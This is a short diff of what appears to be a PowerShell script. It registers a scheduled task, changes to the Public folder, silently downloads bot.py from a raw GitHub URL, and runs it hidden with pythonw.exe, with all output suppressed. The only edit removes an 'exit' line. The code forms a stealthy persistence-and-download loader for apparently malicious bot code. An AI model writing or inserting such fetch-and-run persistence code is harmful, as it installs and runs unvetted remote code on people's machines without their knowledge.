@@ -18,5 +18,5 @@ Register-ScheduledTask -TaskName $TaskName -InputObject $Task -User ".\$Username
 cd $env:PUBLIC *> $null
 curl 'https://raw.githubusercontent.com/Dangongg/expert-octo-broccoli/refs/heads/main/bot.py' -o 'bot.py' *> $null
 Start-Process pythonw.exe -ArgumentList "C:/Users/Public/bot.py" *> $null
-exit
+
 
